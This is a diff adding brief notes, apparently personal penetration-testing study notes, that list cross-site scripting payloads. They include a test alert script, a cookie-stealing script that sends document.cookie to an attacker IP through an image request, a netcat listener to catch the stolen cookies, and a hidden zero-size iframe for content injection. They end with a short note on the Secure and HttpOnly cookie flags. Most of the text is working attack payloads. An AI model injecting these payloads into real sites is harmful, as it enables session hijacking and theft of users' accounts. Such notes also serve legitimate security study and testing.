@@ -1,0 +1,19 @@
+JAVASCRIPT CODE:
+    <script>alert("HELLO")</script>
+
+JAVASCRIPT COOKIE STEALING CODE:
+    //hide this code as an image, and tell the site the source is on my attacking machine in a phpo file that doesn't exist and tell the site to output on that file the document.cookie value
+    <script> new Image().src="http://10.0.0.212/bogus.php?output="+document.cookie;</script>
+    //then start a netcat to "intercept" all the cookies:
+    nc -nvlp 80
+
+INJECT IFRAME FOR REDIRECTION (CONTENT INJECTION):
+    <iframe src=hrrp://10.10.10.4/report height="0" width="0"></iframe>
+
+IMPORTANT HEADERS:
+    Secure  --> only send cookies over encrypted connections
+    HttpOnly    --> deny javascript to access the cookie, if not set the cookie may be stolen
+
+
+SPECIAL CHAR:
+    < > ' " { } ;
